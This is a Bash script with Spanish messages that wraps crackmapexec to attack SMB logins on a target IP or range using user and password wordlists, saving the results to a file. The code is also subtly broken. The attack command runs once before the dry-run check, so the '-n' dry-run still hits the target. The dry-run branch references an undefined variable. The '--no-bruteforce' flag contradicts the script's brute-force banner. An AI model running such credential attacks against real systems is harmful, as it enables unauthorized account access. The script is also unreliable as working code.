#!/usr/bin/env bash
set -euo pipefail

TARGET=""
USERLIST=""
PASSLIST=""
OUTDIR="output"
DRYRUN=0

usage() {
  echo "Uso: $0 -t <target> -U users.txt -P passwords.txt [-n]"
  echo ""
  echo "  -t TARGET        IP objetivo o rango (obligatorio)"
  echo "  -U USERS         Wordlist de usuarios"
  echo "  -P PASSWORDS     Wordlist de contraseñas"
  echo "  -n               Dry-run (mostrar comando sin ejecutar)"
  exit 1
}

while getopts ":t:U:P:n" opt; do
  case "$opt" in
    t) TARGET="$OPTARG" ;;
    U) USERLIST="$OPTARG" ;;
    P) PASSLIST="$OPTARG" ;;
    n) DRYRUN=1 ;;
    *) usage ;;
  esac
done

[[ -z "$TARGET" || -z "$USERLIST" || -z "$PASSLIST" ]] && usage

[[ ! -f "$USERLIST" ]] && { echo "[-] No se encuentra la lista de usuarios: $USERLIST"; exit 1; }
[[ ! -f "$PASSLIST" ]] && { echo "[-] No se encuentra la lista de contraseñas: $PASSLIST"; exit 1; }

command -v crackmapexec >/dev/null 2>&1 || { echo "[-] crackmapexec no está instalado"; exit 1; }

mkdir -p "$OUTDIR"
OUTFILE="$OUTDIR/smb_brute_${TARGET//\//_}_$(date +%s).txt"

crackmapexec smb "$TARGET" -u "$USERLIST" -p "$PASSLIST" --no-bruteforce | tee "$OUTFILE"


echo "======================================="
echo "[*] Fuerza bruta SMB con crackmapexec"
echo " Target    : $TARGET"
echo " Usuarios  : $USERLIST"
echo " Passwords : $PASSLIST"
echo "======================================="

if [[ $DRYRUN -eq 1 ]]; then
  echo "[DRY-RUN] $CMD"
else
  echo "[*] Ejecutando..."
  crackmapexec smb "$TARGET" -u "$USERLIST" -p "$PASSLIST" --no-bruteforce | tee "$OUTFILE"
  echo "[✓] Resultados guardados en: $OUTFILE"
fi
